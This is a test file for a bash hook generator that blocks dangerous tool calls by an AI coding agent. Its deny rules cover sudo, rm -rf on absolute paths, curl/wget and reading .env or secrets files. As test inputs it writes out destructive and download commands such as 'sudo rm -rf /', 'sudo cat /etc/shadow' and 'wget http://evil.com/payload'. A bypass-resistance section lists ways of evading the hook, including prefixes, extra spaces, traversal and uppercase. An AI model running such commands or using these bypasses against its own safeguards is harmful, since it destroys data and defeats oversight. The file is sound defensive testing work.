import { describe, it, expect } from 'vitest'
import { execSync } from 'node:child_process'
import { writeFileSync, unlinkSync, mkdtempSync, rmdirSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { generateEnforceScript } from '../src/core/hook-generator.js'
import { parseDenyPattern } from '../src/core/hook-script-builder.js'

// ============================================================
// Test Helper: Execute the generated shell script with real bash
// ============================================================

interface ScriptResult {
  readonly code: number
  readonly stdout: string
  readonly stderr: string
}

function createTestScript(denyRules: readonly string[]): string {
  return generateEnforceScript(denyRules)
}

function executeHook(
  script: string,
  toolName: string,
  toolInput: Record<string, unknown>,
): ScriptResult {
  const tmpDir = mkdtempSync(join(tmpdir(), 'csg-enforce-'))
  const scriptPath = join(tmpDir, 'test-hook.sh')
  writeFileSync(scriptPath, script, { mode: 0o755 })

  const input = JSON.stringify({ tool_name: toolName, tool_input: toolInput })
  // Escape single quotes in JSON for safe shell embedding
  const escapedInput = input.replace(/'/g, "'\\''")

  try {
    const stdout = execSync(
      `printf '%s' '${escapedInput}' | bash "${scriptPath}"`,
      { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] },
    )
    return { code: 0, stdout, stderr: '' }
  } catch (e: unknown) {
    const err = e as { status?: number; stdout?: string; stderr?: string }
    return {
      code: err.status ?? 1,
      stdout: err.stdout ?? '',
      stderr: err.stderr ?? '',
    }
  } finally {
    try { unlinkSync(scriptPath) } catch {}
    try { rmdirSync(tmpDir) } catch {}
  }
}

// Convenience: generate script and run against given input
function enforce(
  denyRules: readonly string[],
  toolName: string,
  toolInput: Record<string, unknown>,
): ScriptResult {
  const script = createTestScript(denyRules)
  return executeHook(script, toolName, toolInput)
}

// ============================================================
// Balanced profile deny rules (the most common configuration)
// ============================================================
const BALANCED_DENY = [
  'Bash(sudo *)',
  'Bash(rm -rf /*)',
  'Read(**/.env)',
  'Read(**/secrets/**)',
] as const

// Strict profile deny rules
const STRICT_DENY = [
  'Bash(sudo *)',
  'Bash(rm -rf /*)',
  'Bash(curl *)',
  'Bash(wget *)',
  'Read(**/.env)',
  'Read(**/secrets/**)',
  'Write(**/.env)',
] as const

// ============================================================
// CRITICAL: Bash deny enforcement - simple commands
// ============================================================
describe('CRITICAL: Bash deny enforcement', () => {
  const script = createTestScript(BALANCED_DENY)

  describe('must BLOCK dangerous commands', () => {
    it('blocks: sudo rm -rf /', () => {
      const r = executeHook(script, 'Bash', { command: 'sudo rm -rf /' })
      expect(r.code).toBe(2)
      expect(r.stderr).toContain('BLOCKED')
    })

    it('blocks: sudo apt install malware', () => {
      const r = executeHook(script, 'Bash', { command: 'sudo apt install malware' })
      expect(r.code).toBe(2)
    })

    it('blocks: sudo chmod 777 /etc/passwd', () => {
      const r = executeHook(script, 'Bash', { command: 'sudo chmod 777 /etc/passwd' })
      expect(r.code).toBe(2)
    })

    it('blocks: rm -rf /home', () => {
      const r = executeHook(script, 'Bash', { command: 'rm -rf /home' })
      expect(r.code).toBe(2)
    })

    it('blocks: rm -rf /tmp/important', () => {
      const r = executeHook(script, 'Bash', { command: 'rm -rf /tmp/important' })
      expect(r.code).toBe(2)
    })

    it('blocks: rm -rf /var/log', () => {
      const r = executeHook(script, 'Bash', { command: 'rm -rf /var/log' })
      expect(r.code).toBe(2)
    })
  })

  describe('must ALLOW safe commands', () => {
    it('allows: npm install', () => {
      const r = executeHook(script, 'Bash', { command: 'npm install' })
      expect(r.code).toBe(0)
    })

    it('allows: git status', () => {
      const r = executeHook(script, 'Bash', { command: 'git status' })
      expect(r.code).toBe(0)
    })

    it('allows: echo hello world', () => {
      const r = executeHook(script, 'Bash', { command: 'echo hello world' })
      expect(r.code).toBe(0)
    })

    it('allows: ls -la /home', () => {
      const r = executeHook(script, 'Bash', { command: 'ls -la /home' })
      expect(r.code).toBe(0)
    })

    it('allows: cat /etc/hostname', () => {
      const r = executeHook(script, 'Bash', { command: 'cat /etc/hostname' })
      expect(r.code).toBe(0)
    })

    it('allows: rm -rf ./node_modules (relative path)', () => {
      const r = executeHook(script, 'Bash', { command: 'rm -rf ./node_modules' })
      expect(r.code).toBe(0)
    })

    it('allows: rm file.txt (no -rf flag)', () => {
      const r = executeHook(script, 'Bash', { command: 'rm file.txt' })
      expect(r.code).toBe(0)
    })
  })

  describe('must NOT false-positive on similar words', () => {
    it('allows: sudoku (not sudo)', () => {
      const r = executeHook(script, 'Bash', { command: 'sudoku' })
      expect(r.code).toBe(0)
    })

    it('allows: echo sudo (sudo as argument, not command)', () => {
      const r = executeHook(script, 'Bash', { command: 'echo sudo' })
      expect(r.code).toBe(0)
    })

    it('allows: grep sudo /var/log/auth.log', () => {
      const r = executeHook(script, 'Bash', { command: 'grep sudo /var/log/auth.log' })
      expect(r.code).toBe(0)
    })

    it('allows: man sudo (looking up documentation)', () => {
      // "man" is the command, "sudo" is just an argument
      const r = executeHook(script, 'Bash', { command: 'man sudo' })
      expect(r.code).toBe(0)
    })
  })
})

// ============================================================
// CRITICAL: Compound command detection
// ============================================================
describe('CRITICAL: Compound command detection', () => {
  const script = createTestScript(BALANCED_DENY)

  describe('must BLOCK sudo hidden in compound commands', () => {
    it('blocks: pipe chain - echo foo | sudo rm -rf /', () => {
      const r = executeHook(script, 'Bash', { command: 'echo foo | sudo rm -rf /' })
      expect(r.code).toBe(2)
      expect(r.stderr).toContain('BLOCKED')
    })

    it('blocks: && chain - cd /tmp && sudo rm -rf /', () => {
      const r = executeHook(script, 'Bash', { command: 'cd /tmp && sudo rm -rf /' })
      expect(r.code).toBe(2)
    })

    it('blocks: semicolon - echo hello; sudo rm -rf /', () => {
      const r = executeHook(script, 'Bash', { command: 'echo hello; sudo rm -rf /' })
      expect(r.code).toBe(2)
    })

    it('blocks: || chain - false || sudo rm -rf /', () => {
      const r = executeHook(script, 'Bash', { command: 'false || sudo rm -rf /' })
      expect(r.code).toBe(2)
    })

    it('blocks: rm -rf in && chain - cd /tmp && rm -rf /home', () => {
      const r = executeHook(script, 'Bash', { command: 'cd /tmp && rm -rf /home' })
      expect(r.code).toBe(2)
    })

    it('blocks: three-part chain with sudo in middle', () => {
      const r = executeHook(script, 'Bash', { command: 'echo a && sudo rm -rf / && echo b' })
      expect(r.code).toBe(2)
    })

    it('blocks: sudo at end of long chain', () => {
      const r = executeHook(script, 'Bash', { command: 'cd /tmp && ls && pwd && sudo rm -rf /' })
      expect(r.code).toBe(2)
    })
  })

  describe('must BLOCK command substitution attacks', () => {
    it('blocks: $(sudo rm -rf /)', () => {
      const r = executeHook(script, 'Bash', { command: 'echo $(sudo rm -rf /)' })
      expect(r.code).toBe(2)
    })

    it('blocks: sudo inside $() at any position', () => {
      const r = executeHook(script, 'Bash', { command: 'result=$(sudo cat /etc/shadow)' })
      expect(r.code).toBe(2)
    })
  })

  describe('must ALLOW safe compound commands', () => {
    it('allows: npm install && npm test', () => {
      const r = executeHook(script, 'Bash', { command: 'npm install && npm test' })
      expect(r.code).toBe(0)
    })

    it('allows: cd /tmp && ls -la', () => {
      const r = executeHook(script, 'Bash', { command: 'cd /tmp && ls -la' })
      expect(r.code).toBe(0)
    })

    it('allows: echo foo | grep bar', () => {
      const r = executeHook(script, 'Bash', { command: 'echo foo | grep bar' })
      expect(r.code).toBe(0)
    })

    it('allows: git add . && git commit -m "test" && git push', () => {
      const r = executeHook(script, 'Bash', { command: 'git add . && git commit -m test && git push' })
      expect(r.code).toBe(0)
    })
  })
})

// ============================================================
// CRITICAL: Non-Bash tool enforcement (Read/Write/Edit)
// ============================================================
describe('CRITICAL: Non-Bash tool enforcement', () => {
  describe('Read tool - .env file blocking', () => {
    const script = createTestScript(BALANCED_DENY)

    it('blocks: /app/.env', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/.env' })
      expect(r.code).toBe(2)
      expect(r.stderr).toContain('BLOCKED')
    })

    it('blocks: /home/user/project/.env', () => {
      const r = executeHook(script, 'Read', { file_path: '/home/user/project/.env' })
      expect(r.code).toBe(2)
    })

    it('blocks: /var/www/.env', () => {
      const r = executeHook(script, 'Read', { file_path: '/var/www/.env' })
      expect(r.code).toBe(2)
    })

    it('blocks: nested secrets - /app/config/secrets/api.key', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/config/secrets/api.key' })
      expect(r.code).toBe(2)
    })

    it('blocks: secrets at root - /secrets/db-password', () => {
      const r = executeHook(script, 'Read', { file_path: '/secrets/db-password' })
      expect(r.code).toBe(2)
    })

    it('allows: /app/src/index.ts (normal source file)', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/src/index.ts' })
      expect(r.code).toBe(0)
    })

    it('allows: /app/package.json', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/package.json' })
      expect(r.code).toBe(0)
    })

    it('allows: /app/README.md', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/README.md' })
      expect(r.code).toBe(0)
    })

    it('allows: /project/.envrc (NOT .env - false positive prevention)', () => {
      const r = executeHook(script, 'Read', { file_path: '/project/.envrc' })
      expect(r.code).toBe(0)
    })

    it('allows: /app/.environment (NOT .env - false positive prevention)', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/.environment' })
      expect(r.code).toBe(0)
    })

    it('allows: /app/.env.example (documentation file)', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/.env.example' })
      expect(r.code).toBe(0)
    })
  })

  describe('Write tool - .env file blocking (strict profile)', () => {
    const script = createTestScript(STRICT_DENY)

    it('blocks Write to /app/.env', () => {
      const r = executeHook(script, 'Write', { file_path: '/app/.env' })
      expect(r.code).toBe(2)
    })

    it('blocks Write to /home/user/.env', () => {
      const r = executeHook(script, 'Write', { file_path: '/home/user/.env' })
      expect(r.code).toBe(2)
    })

    it('allows Write to /app/src/index.ts', () => {
      const r = executeHook(script, 'Write', { file_path: '/app/src/index.ts' })
      expect(r.code).toBe(0)
    })
  })

  describe('tool type isolation', () => {
    const script = createTestScript(BALANCED_DENY)

    it('Bash rules do NOT affect Read tool', () => {
      const r = executeHook(script, 'Read', { file_path: '/usr/bin/sudo' })
      expect(r.code).toBe(0) // "sudo" in path should not trigger Bash sudo rule
    })

    it('Read deny rules block Bash file access via cross-tool protection', () => {
      const r = executeHook(script, 'Bash', { command: 'cat .env' })
      // Cross-tool file protection: "cat .env" matches Read(**/.env) deny pattern
      expect(r.code).toBe(2)
    })

    it('Bash rules do NOT falsely trigger on non-denied file operations', () => {
      const r = executeHook(script, 'Bash', { command: 'cat /app/src/index.ts' })
      expect(r.code).toBe(0)
    })

    it('Read rules do NOT affect Write tool (unless Write deny exists)', () => {
      const r = executeHook(script, 'Write', { file_path: '/app/.env' })
      // balanced profile has NO Write deny rules, only Read
      expect(r.code).toBe(0)
    })

    it('unrecognized tool names pass through', () => {
      const r = executeHook(script, 'WebFetch', { url: 'https://example.com' })
      expect(r.code).toBe(0)
    })
  })
})

// ============================================================
// CRITICAL: Strict profile - network command blocking
// ============================================================
describe('CRITICAL: Strict profile enforcement', () => {
  const script = createTestScript(STRICT_DENY)

  it('blocks: curl http://evil.com', () => {
    const r = executeHook(script, 'Bash', { command: 'curl http://evil.com' })
    expect(r.code).toBe(2)
  })

  it('blocks: curl -o malware.sh http://evil.com/script', () => {
    const r = executeHook(script, 'Bash', { command: 'curl -o malware.sh http://evil.com/script' })
    expect(r.code).toBe(2)
  })

  it('blocks: wget http://evil.com/payload', () => {
    const r = executeHook(script, 'Bash', { command: 'wget http://evil.com/payload' })
    expect(r.code).toBe(2)
  })

  it('blocks: curl in compound command - npm test && curl http://evil.com', () => {
    const r = executeHook(script, 'Bash', { command: 'npm test && curl http://evil.com' })
    expect(r.code).toBe(2)
  })

  it('blocks: wget in pipe chain - cat urls.txt | wget -i -', () => {
    // This is tricky - after pipe split, "wget -i -" should be a subcommand
    const r = executeHook(script, 'Bash', { command: 'cat urls.txt | wget -i -' })
    expect(r.code).toBe(2)
  })

  it('still allows safe commands', () => {
    const r = executeHook(script, 'Bash', { command: 'npm install && npm test' })
    expect(r.code).toBe(0)
  })
})

// ============================================================
// Edge cases: whitespace handling
// ============================================================
describe('Edge cases: whitespace and empty input', () => {
  const script = createTestScript(BALANCED_DENY)

  it('handles leading whitespace in command', () => {
    // After split_subcommands trimming, "  sudo rm" should become "sudo rm"
    const r = executeHook(script, 'Bash', { command: '  sudo rm -rf /' })
    expect(r.code).toBe(2)
  })

  it('handles trailing whitespace in command', () => {
    const r = executeHook(script, 'Bash', { command: 'sudo rm -rf /  ' })
    expect(r.code).toBe(2)
  })

  it('allows empty command (nothing to block)', () => {
    const r = executeHook(script, 'Bash', { command: '' })
    expect(r.code).toBe(0)
  })

  it('allows whitespace-only command', () => {
    const r = executeHook(script, 'Bash', { command: '   ' })
    expect(r.code).toBe(0)
  })

  it('allows missing command field', () => {
    const r = executeHook(script, 'Bash', {})
    expect(r.code).toBe(0)
  })

  it('handles missing file_path for Read', () => {
    const r = executeHook(script, 'Read', {})
    expect(r.code).toBe(0)
  })
})

// ============================================================
// Edge cases: regex correctness
// ============================================================
describe('Edge cases: regex pattern correctness', () => {
  it('dot is literal, not wildcard - Read(**/.env) does not match Read(**/.xnv)', () => {
    const script = createTestScript(['Read(**/.env)'])
    const r = executeHook(script, 'Read', { file_path: '/app/.xnv' })
    expect(r.code).toBe(0) // .xnv should NOT match .env
  })

  it('? matches single character - Read(test?.txt) matches test1.txt', () => {
    const script = createTestScript(['Read(test?.txt)'])
    // "test?.txt" -> regex "test.\\.txt"
    const r1 = executeHook(script, 'Read', { file_path: 'test1.txt' })
    expect(r1.code).toBe(2)
    const r2 = executeHook(script, 'Read', { file_path: 'testAB.txt' })
    // ? matches exactly one char, but regex . matches one char
    // However, =~ is unanchored, so this might still match...
    // "testAB.txt" =~ "test.\\.txt" — test matches test, . matches A, \\.txt matches B.txt? No.
    // Actually "test.\\.txt" as regex: test + any_char + literal_dot + txt
    // Against "testAB.txt": test matches, . matches A, \\.txt tries to match "B.txt"
    // \\. matches literal ".", so it needs ".txt" which is B.txt - no, "." matches B and then txt...
    // Actually \\.txt means literal dot then txt. "B.txt" has B then .txt.
    // With =~ partial match, the regex "test.\\.txt" would search for the pattern anywhere in the string
    // "testAB.txt" — does it contain "test" + anychar + "." + "txt"?
    // t-e-s-t-A-B-.-t-x-t: test matches at 0-3, . matches A at 4, \\. needs literal . at 5 but B is at 5 -> no
    // Backtrack: can't find a match. So r2.code should be 0.
    expect(r2.code).toBe(0)
  })

  it('* matches any sequence - Bash(npm *) matches npm install', () => {
    const script = createTestScript(['Bash(npm *)'])
    const r = executeHook(script, 'Bash', { command: 'npm install' })
    expect(r.code).toBe(2)
  })

  it('** matches any path - Read(**/config/**) matches deep paths', () => {
    const script = createTestScript(['Read(**/config/**)'])
    const r = executeHook(script, 'Read', { file_path: '/app/src/config/db.json' })
    expect(r.code).toBe(2)
  })
})

// ============================================================
// Bypass resistance tests
// ============================================================
describe('Bypass resistance', () => {
  const script = createTestScript(BALANCED_DENY)

  describe('TOOL_NAME extracted from JSON, not spoofable via env var', () => {
    it('script extracts TOOL_NAME from JSON input', () => {
      // Even if TOOL_NAME env var is set to something else,
      // the script re-extracts it from JSON input
      const scriptContent = createTestScript(BALANCED_DENY)
      expect(scriptContent).toContain("TOOL_NAME=$(printf '%s' \"$input\" | jq -r '.tool_name // \"\"' 2>/dev/null)")
    })
  })

  describe('path traversal in file paths', () => {
    it('blocks: ../../.env (relative path traversal)', () => {
      // The regex .*/.env should match ../../.env because it contains /.env
      const r = executeHook(script, 'Read', { file_path: '../../.env' })
      expect(r.code).toBe(2)
    })

    it('blocks: /app/./../../.env (complex traversal)', () => {
      const r = executeHook(script, 'Read', { file_path: '/app/./../../.env' })
      expect(r.code).toBe(2)
    })
  })

  describe('case sensitivity', () => {
    it('allows: SUDO rm (bash is case-sensitive, SUDO != sudo)', () => {
      const r = executeHook(script, 'Bash', { command: 'SUDO rm -rf /' })
      // Pattern is "sudo *", SUDO doesn't match (case-sensitive)
      expect(r.code).toBe(0)
    })

    it('correctly handles tool name case: "Bash" vs "bash" (case-insensitive)', () => {
      // Claude Code sends "Bash" (capital B)
      const r1 = executeHook(script, 'Bash', { command: 'sudo rm' })
      expect(r1.code).toBe(2) // Should block

      // "bash" (lowercase) should also be caught (case-insensitive matching)
      const r2 = executeHook(script, 'bash', { command: 'sudo rm' })
      expect(r2.code).toBe(2) // Now blocked thanks to case-insensitive matching
    })
  })

  describe('fixed: multi-space bypass now blocked', () => {
    it('blocks extra spaces in rm -rf  / (whitespace normalization)', () => {
      // "rm  -rf  /home" has double spaces, now normalized before matching
      const r = executeHook(script, 'Bash', { command: 'rm  -rf  /home' })
      expect(r.code).toBe(2) // Fixed - whitespace is now collapsed
    })
  })

  describe('fixed: env/command prefix bypass now blocked', () => {
    it('blocks env sudo (prefix command stripping)', () => {
      // "env sudo rm" - prefix "env" is now stripped before matching
      const r = executeHook(script, 'Bash', { command: 'env sudo rm -rf /' })
      expect(r.code).toBe(2) // Fixed - prefix commands are stripped
    })

    it('blocks /usr/bin/sudo (path prefix stripping)', () => {
      const r = executeHook(script, 'Bash', { command: '/usr/bin/sudo rm -rf /' })
      expect(r.code).toBe(2) // Fixed - path prefixes are stripped
    })
  })
})

// ============================================================
// Hook output format verification
// ============================================================
describe('Hook output format', () => {
  const script = createTestScript(BALANCED_DENY)

  it('deny response contains valid JSON with permissionDecision: deny', () => {
    const r = executeHook(script, 'Bash', { command: 'sudo rm' })
    expect(r.code).toBe(2)
    const json = JSON.parse(r.stdout.trim())
    expect(json.hookSpecificOutput.permissionDecision).toBe('deny')
    expect(json.hookSpecificOutput.hookEventName).toBe('PreToolUse')
    expect(json.hookSpecificOutput.permissionDecisionReason).toContain('BLOCKED')
  })

  it('allow response produces no stdout (clean exit)', () => {
    const r = executeHook(script, 'Bash', { command: 'npm test' })
    expect(r.code).toBe(0)
    expect(r.stdout.trim()).toBe('')
  })
})

// ============================================================
// Full profile integration tests
// ============================================================
describe('Full profile integration: balanced', () => {
  const script = createTestScript(BALANCED_DENY)

  // Exhaustive test of all balanced deny rules
  const mustBlock = [
    { tool: 'Bash', input: { command: 'sudo rm -rf /' }, desc: 'sudo rm' },
    { tool: 'Bash', input: { command: 'sudo apt update' }, desc: 'sudo apt' },
    { tool: 'Bash', input: { command: 'rm -rf /etc' }, desc: 'rm -rf /etc' },
    { tool: 'Bash', input: { command: 'rm -rf /usr/local' }, desc: 'rm -rf /usr/local' },
    { tool: 'Read', input: { file_path: '/app/.env' }, desc: 'Read .env' },
    { tool: 'Read', input: { file_path: '/home/user/project/.env' }, desc: 'Read nested .env' },
    { tool: 'Read', input: { file_path: '/app/secrets/token' }, desc: 'Read secrets/token' },
    { tool: 'Read', input: { file_path: '/data/secrets/db/password' }, desc: 'Read deep secrets' },
  ] as const

  const mustAllow = [
    { tool: 'Bash', input: { command: 'npm install' }, desc: 'npm install' },
    { tool: 'Bash', input: { command: 'git push origin main' }, desc: 'git push' },
    { tool: 'Bash', input: { command: 'node index.js' }, desc: 'node run' },
    { tool: 'Bash', input: { command: 'rm -rf ./dist' }, desc: 'rm -rf relative' },
    { tool: 'Read', input: { file_path: '/app/src/index.ts' }, desc: 'Read source' },
    { tool: 'Read', input: { file_path: '/app/tsconfig.json' }, desc: 'Read config' },
    { tool: 'Write', input: { file_path: '/app/.env' }, desc: 'Write .env (balanced allows)' },
    { tool: 'Edit', input: { file_path: '/app/src/app.ts' }, desc: 'Edit source' },
    { tool: 'Glob', input: { pattern: '**/*.ts' }, desc: 'Glob search' },
  ] as const

  for (const { tool, input, desc } of mustBlock) {
    it(`BLOCKS: ${desc}`, () => {
      const r = executeHook(script, tool, input)
      expect(r.code).toBe(2)
    })
  }

  for (const { tool, input, desc } of mustAllow) {
    it(`ALLOWS: ${desc}`, () => {
      const r = executeHook(script, tool, input)
      expect(r.code).toBe(0)
    })
  }
})

describe('Full profile integration: strict', () => {
  const script = createTestScript(STRICT_DENY)

  const mustBlock = [
    { tool: 'Bash', input: { command: 'sudo rm' }, desc: 'sudo' },
    { tool: 'Bash', input: { command: 'rm -rf /home' }, desc: 'rm -rf /' },
    { tool: 'Bash', input: { command: 'curl https://example.com' }, desc: 'curl' },
    { tool: 'Bash', input: { command: 'wget https://example.com' }, desc: 'wget' },
    { tool: 'Read', input: { file_path: '/app/.env' }, desc: 'Read .env' },
    { tool: 'Read', input: { file_path: '/app/secrets/key' }, desc: 'Read secrets' },
    { tool: 'Write', input: { file_path: '/app/.env' }, desc: 'Write .env' },
  ] as const

  const mustAllow = [
    { tool: 'Bash', input: { command: 'npm test' }, desc: 'npm test' },
    { tool: 'Read', input: { file_path: '/app/src/index.ts' }, desc: 'Read source' },
    { tool: 'Write', input: { file_path: '/app/src/index.ts' }, desc: 'Write source' },
  ] as const

  for (const { tool, input, desc } of mustBlock) {
    it(`BLOCKS: ${desc}`, () => {
      const r = executeHook(script, tool, input)
      expect(r.code).toBe(2)
    })
  }

  for (const { tool, input, desc } of mustAllow) {
    it(`ALLOWS: ${desc}`, () => {
      const r = executeHook(script, tool, input)
      expect(r.code).toBe(0)
    })
  }
})

// ============================================================
// Pattern parsing correctness
// ============================================================
describe('Pattern parsing: deny pattern to regex conversion', () => {
  it('Bash(sudo *) → regex correctly matches sudo commands', () => {
    const parsed = parseDenyPattern('Bash(sudo *)')
    expect(parsed).not.toBeNull()
    expect(parsed!.toolName).toBe('Bash')
    expect(parsed!.regex).toBe('sudo .*$')
    // Verify regex behavior
    expect('sudo rm').toMatch(new RegExp(`^${parsed!.regex}`))
    expect('sudo apt install').toMatch(new RegExp(`^${parsed!.regex}`))
    expect('npm install').not.toMatch(new RegExp(`^${parsed!.regex}`))
    expect('sudoku').not.toMatch(new RegExp(`^${parsed!.regex}`))
  })

  it('Bash(rm -rf /*) → regex correctly matches rm commands with absolute paths', () => {
    const parsed = parseDenyPattern('Bash(rm -rf /*)')
    expect(parsed).not.toBeNull()
    expect(parsed!.regex).toBe('rm -rf /.*$')
    expect('rm -rf /home').toMatch(new RegExp(`^${parsed!.regex}`))
    expect('rm -rf /').toMatch(new RegExp(`^${parsed!.regex}`))
    expect('rm -rf ./local').not.toMatch(new RegExp(`^${parsed!.regex}`))
    expect('rm file.txt').not.toMatch(new RegExp(`^${parsed!.regex}`))
  })

  it('Read(**/.env) → regex correctly matches .env paths', () => {
    const parsed = parseDenyPattern('Read(**/.env)')
    expect(parsed).not.toBeNull()
    expect(parsed!.regex).toBe('.*/\\.env$')
    // $ anchor prevents false positives on .envrc, .environment etc.
    expect('/app/.env').toMatch(new RegExp(parsed!.regex))
    expect('/home/user/.env').toMatch(new RegExp(parsed!.regex))
    expect('../../.env').toMatch(new RegExp(parsed!.regex))
    expect('/app/.envrc').not.toMatch(new RegExp(parsed!.regex))
    expect('/app/.environment').not.toMatch(new RegExp(parsed!.regex))
  })

  it('Read(**/secrets/**) → regex correctly matches secrets paths', () => {
    const parsed = parseDenyPattern('Read(**/secrets/**)')
    expect(parsed).not.toBeNull()
    expect(parsed!.regex).toBe('.*/secrets/.*$')
    expect('/app/secrets/key').toMatch(new RegExp(parsed!.regex))
    expect('/home/secrets/db/pass').toMatch(new RegExp(parsed!.regex))
  })

  it('legacy colon syntax Bash(sudo:*) → same result as modern', () => {
    const legacy = parseDenyPattern('Bash(sudo:*)')
    const modern = parseDenyPattern('Bash(sudo *)')
    expect(legacy).not.toBeNull()
    expect(modern).not.toBeNull()
    // Legacy adds " *" to arg, so "sudo" becomes "sudo *" → "sudo .*"
    expect(legacy!.regex).toBe(modern!.regex)
  })
})

// ============================================================
// Script structural integrity
// ============================================================
function assertValidBash(script: string): void {
  const tmpDir = mkdtempSync(join(tmpdir(), 'csg-syntax-'))
  const scriptPath = join(tmpDir, 'syntax-check.sh')
  writeFileSync(scriptPath, script, { mode: 0o755 })
  try {
    execSync(`bash -n "${scriptPath}"`, { encoding: 'utf-8' })
  } catch (e: unknown) {
    const err = e as { stderr?: string }
    throw new Error(`Generated script has syntax errors: ${err.stderr}`)
  } finally {
    try { unlinkSync(scriptPath) } catch {}
    try { rmdirSync(tmpDir) } catch {}
  }
}

describe('Script structural integrity', () => {
  it('generated script is valid bash (no syntax errors)', () => {
    assertValidBash(createTestScript(BALANCED_DENY))
  })

  it('strict profile script is valid bash', () => {
    assertValidBash(createTestScript(STRICT_DENY))
  })

  it('empty rules generate valid bash script', () => {
    assertValidBash(createTestScript([]))
  })

  it('script starts with shebang', () => {
    const script = createTestScript(BALANCED_DENY)
    expect(script.startsWith('#!/bin/bash')).toBe(true)
  })

  it('script ends with exit 0 (default allow)', () => {
    const script = createTestScript(BALANCED_DENY)
    expect(script.trimEnd().endsWith('exit 0')).toBe(true)
  })
})
